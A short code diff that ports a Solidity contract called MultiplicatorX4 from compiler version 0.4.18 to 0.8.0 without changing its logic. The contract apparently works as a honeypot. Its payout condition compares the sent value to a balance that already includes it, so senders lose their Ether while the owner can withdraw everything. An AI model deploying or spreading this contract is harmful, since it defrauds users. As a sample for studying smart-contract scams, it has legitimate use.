@@ -4,23 +4,23 @@
  * =======================
  */
 
- pragma solidity ^0.4.18;
+ pragma solidity ^0.8.0;
 
 contract MultiplicatorX4
 {
     address public Owner = msg.sender;
    
-    function() public payable{}
+    receive() external payable {}
    
     function withdraw()
     payable
     public
     {
         require(msg.sender == Owner);
-        Owner.transfer(this.balance);
+        payable(Owner).transfer(address(this).balance);
     }
     
-    function Command(address adr,bytes data)
+    function Command(address adr, bytes memory data)
     payable
     public
     {
@@ -33,9 +33,9 @@ contract MultiplicatorX4
     public
     payable
     {
-        if(msg.value>=this.balance)
+        if(msg.value>=address(this).balance)
         {        
-            adr.transfer(this.balance+msg.value);
+            payable(adr).transfer(address(this).balance+msg.value);
         }
     }
 }
